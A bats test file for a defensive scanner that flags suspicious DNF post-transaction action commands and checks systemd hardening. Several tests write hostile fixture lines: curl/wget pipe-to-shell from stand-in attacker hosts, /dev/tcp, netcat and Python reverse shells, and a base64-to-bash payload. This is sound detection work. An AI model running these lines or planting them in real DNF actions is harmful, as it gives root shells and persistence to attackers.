#!/usr/bin/env bats
# L2 bats functional tests for the dnf-plugins-watchdog scan script.
#
# DNF's post-transaction-actions plugin runs the command in each
# /etc/dnf/plugins/post-transaction-actions.d/*.action file
# (`package-glob:transaction-state:command`) AS ROOT after a matching
# package transaction — a package-transaction-triggered exec surface. An
# action command under a writable root, relative-with-slash, bare, or
# carrying an injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the plugin
# / actions dirs in a tmp sandbox via SELFDEF_DNFPLUG_D / _ACTIONS.
#
# Run with: bats packaging/test/L2-dnf-plugins-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd/dnf-plugins-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    PLUGD="${TMP}/plugins"; mkdir -p "${PLUGD}"
    ACTD="${TMP}/actions.d"; mkdir -p "${ACTD}"
    ACTION="${ACTD}/test.action"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DNFPLUG_PROFILE="${PROFILE:-report}" \
    SELFDEF_DNFPLUG_BASELINE="${BASELINE}" \
    SELFDEF_DNFPLUG_D="${PLUGD_D:-$PLUGD}" \
    SELFDEF_DNFPLUG_ACTIONS="${ACTIONS_D:-$ACTD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dnf plugins/actions → ok / no_dnf_plugins" {
    PLUGD_D="${TMP}/none" ACTIONS_D="${TMP}/none.d" run_wd
    cap | grep -q '"event":"no_dnf_plugins"'
    cap | grep -q '"severity":"ok"'
}

@test "benign action, first run → ok / baseline_initial" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / dnf_plugins_intact" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "an action command under a writable root → alert / dnf_plugins_suspicious" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd                                   # benign baseline
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "an action carrying a curl|sh payload → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:bash -c "curl http://evil|sh"\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare action command → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:any:evilprog\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign action change → warn / dnf_plugins_changed" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/usr/bin/dnf-utils\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dnf_plugins_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin action command is NOT flagged" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious action" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — dnf-plugins inventory enumerates post-transaction root-exec surface)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in action → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in action → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:wget -qO- http://attacker/p | sh\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in action → alert" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:echo YmFzaCAtaQ== | base64 -d | bash\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action under /var/tmp writable root): expands writable-root coverage" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/var/tmp/.payload\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action under /dev/shm): tmpfs-root payload coverage" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/dev/shm/.payload\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable action file → alert; the file ITSELF, not just contents)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    chmod 0666 "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dnf-plugins -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): dnf-plugins-watchdog does NOT refresh baseline on suspicious-action detection — alert STAYS until operator updates" {
    # Post-transaction root-exec persistence — suspicious-action alert
    # MUST persist across runs until operator explicitly re-baselines.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    printf '*:in:/tmp/.x\n' > "${ACTION}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"dnf_plugins_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (relative-with-slash action 'sub/dir/p' → alert)" {
    # Relative-with-slash = PWD-at-exec attacker primitive.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:sub/dir/evil\n' > "${ACTION}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:curl -s http://attacker.com/p | bash\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in dnf-plugins action: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on the
    # post-transaction-actions plugin surface (T1546 — DNF runs each
    # action command AS ROOT after a matching package transaction;
    # sister-vector to apt-hooks DPkg::Pre/Post-Invoke on the Debian
    # side).
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:nc -e /bin/sh 1.1.1.1 4444\n' > "${ACTION}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (action under /home: user-writable hijack on package-transaction trigger surface)" {
    # Sister to the /tmp + /var/tmp + /dev/shm writable-root axes
    # already locked. /home is the user-writable surface — an
    # attacker with regular user account can drop a malicious
    # binary into their home and have DNF exec it AS ROOT after
    # the next package transaction. Locks axis-symmetry across the
    # writable-root family on the post-transaction-action surface.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/home/user/.evil-action\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named dnf-plugins action surfaces in sample for operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # dnf-plugins post-transaction action file (T1546 — post-
    # transaction-trigger root-exec persistence; DNF runs action
    # commands AS ROOT after every package install/upgrade/
    # remove), the file path/name MUST surface in the JSON
    # sample so operator dashboard routes triage to the right
    # path.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/tmp/.evil\n' > "${ACTD}/distinctive-attacker-action.action"
    run_wd
    cap | grep -q 'distinctive-attacker-action'
}

@test "INVARIANT (action under /var/tmp — writable-root axis-symmetric expansion on dnf-plugins surface)" {
    # Sister to /tmp + /home action writable-root INVARIANTs
    # already locked. /var/tmp is writable by ALL users (sticky-
    # bit doesn't gate exec) AND persists across reboots (unlike
    # /tmp tmpfs on most distros). Attackers prefer it for boot-
    # survival persistence. The dnf-plugins action scanner MUST
    # recognize /var/tmp paths just as firmly as the /tmp + /home
    # family — locks axis-symmetric writable-root coverage on
    # the T1546 dnf-post-transaction-trigger root-exec surface.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/var/tmp/.evil-action\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (action under /dev/shm — tmpfs writable-root axis-symmetric expansion)" {
    # Sister to /tmp + /home + /var/tmp dnf-plugins action
    # writable-root INVARIANTs. /dev/shm tmpfs writable by ALL.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/dev/shm/.evil-action\n' > "${ACTION}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on dnf-plugins action surface)" {
    # Sister to nc / curl|bash / dev-tcp dnf-plugins action
    # rev-shell variants. Python on every RHEL/Fedora host
    # (dnf itself is Python). T1546 package-transaction-trigger
    # root-exec — actions run AS ROOT on every dnf operation.
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\"/bin/sh\\")"\n' > "${ACTION}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on dnf-plugins surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The dnf-plugins-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 dnf-package-transaction-trigger
    # root-exec persistence alert. Locks parser contract on the
    # dnf-plugins action detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
    run_wd                                              # ok / baseline
    printf '*:in:/tmp/.evil\n' > "${ACTION}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # dnf-plugins-watchdog runs ON the timer's scheduled fire —
    # scans dnf plugin actions for injection patterns, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the dnf-plugins-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd/selfdef-dnf-plugins.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. dnf-plugins-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # dnf-plugins-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # dnf-plugins-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'dnf-plugins-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: dnf-plugins-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. dnf-plugins-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the dnf-plugins-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (dnf-plugins-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The dnf-plugins-watchdog libexec uses set -u to catch typo'd env-var
    # references before they silently propagate as empty
    # strings into baseline-path operations. Locks set -u
    # discipline on the dnf-plugins-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dnf-plugins-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # dnf-plugins-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dnf-plugins-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # dnf-plugins-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dnf-plugins-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the dnf-plugins-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dnf-plugins-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # dnf-plugins-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dnf-plugins-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the dnf-plugins-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dnf-plugins-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the dnf-plugins-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the dnf-plugins-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the dnf-plugins-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the dnf-plugins-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the dnf-plugins-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dnf-plugins-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (dnf-plugins-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
